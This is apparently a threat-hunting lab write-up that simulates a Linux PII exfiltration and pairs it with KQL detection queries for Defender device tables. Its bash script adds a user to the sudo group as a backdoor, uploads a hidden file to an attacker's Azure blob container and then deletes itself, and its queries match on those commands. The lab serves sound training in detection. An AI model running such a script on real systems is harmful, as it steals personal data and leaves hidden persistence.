
# Scenario Creation – PII Exfiltration

## Bad Actor Steps
NIST 800-61
* Grants sudo privileges to a specific user (a process known as privilege escalation),
* Extracts PII data from a known location, to Azure blob account
* Deletes itself upon completion to avoid detection.

The attacker’s actions also effectively create a backdoor, potentially enabling future data exfiltration. This lab is designed to introduce basic Linux commands and concepts. It's highly recommended that you attempt to execute the commands on your own before referring to the provided solutions.

```
	#!/bin/bash

# Give user $TARGET_USER sudo privileges (acts as a backdoor)
sudo usermod -aG sudo $TARGET_USER
	
	# Upload target file to Azure Storage for exfiltration
	# ACCOUNT_NAME is the name of the storage account you created
	# ACCESS_KEY is key1 or key2 found in storage account > Security + networking > Access keys
	# CONTAINER_NAME is the name of your blob container in the storage account

	# FILE_NAME is the path to the file you want to exfiltrate, /home/$VM_NAME/.$SECRET_DIRECTORY/.$TEXT_FILE_TO_EXFILTRATE
	# BLOB_NAME is the name of the file in the storage account
	az storage blob upload \
	  --account-name $ACCOUNT_NAME \
	  --account-key $ACCESS_KEY \
	  --container-name $CONTAINER_NAME \
	  --file $FILE_NAME \
	  --name $BLOB_NAME
	
	# Delete this exact script
	rm -- "$0"

```

---

## Tables Used to Detect IoCs
| Parameter |         Description          | 
|-----------|------------------------------|
| Name      |      DeviceFileEvents        | 
| Info      |                              | 
| Purpose   |                              |

| Parameter |         Description          | 
|-----------|------------------------------|
| Name      |      DeviceProcessEvents     | 
| Info      |                              | 
| Purpose   |                              |

| Parameter |         Description          | 
|-----------|------------------------------|
| Name      |      DeviceNetworkEvents     | 
| Info      |                              | 
| Purpose   |                              |

| Parameter |         Description          | 
|-----------|------------------------------|
| Name      |      DeviceRegistryEvents    | 
| Info      |                              | 
| Purpose   |                              |
---
## Related Queries

Query 1: DeviceProcessEvents - Security team ran script to detect any instance of file script adding or modifying, script processes that can detect privilege escalations or exfiltration

```kql
let timePeriodThreshold = ago(3d); // Defines a point in time 3 days ago
let sensitiveGroups = dynamic(["sudo"]); // Add other groups if relevant
DeviceProcessEvents
| where DeviceName contains "Workstation1"
| where Timestamp > timePeriodThreshold
| where InitiatingProcessCommandLine contains "usermod -aG"
| where InitiatingProcessCommandLine has_any (sensitiveGroups) // Checks if the command line contains any of the sensitive group names
| project Timestamp, DeviceName,ActionType, FileName, ProcessCommandLine, FolderPath

```
Query 2: Checking Azure Blob storage exfiltration
```kql
let timePeriodThreshold = ago(3d); // Defines a point in time 3 days ago
DeviceNetworkEvents
| where DeviceName contains "Workstation1"
| where Timestamp > timePeriodThreshold
| where InitiatingProcessCommandLine contains "storage blob upload"

```
Query 3: Device File Events - Finding the file

```kql
DeviceFileEvents
| where DeviceName contains "Workstation1"
| where ActionType == "FileCreated"
| project Timestamp, DeviceName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp asc

```


---

## Created By
### Author Name: Jonathan Gribe
### Author Contact: [LinkedIn account]
### Date: 08/13/2025

## Validated By:
### Reviewer Name:
### Reviewer Contact:
### Validation Date:
---

## Additional Notes
---

## Revision History
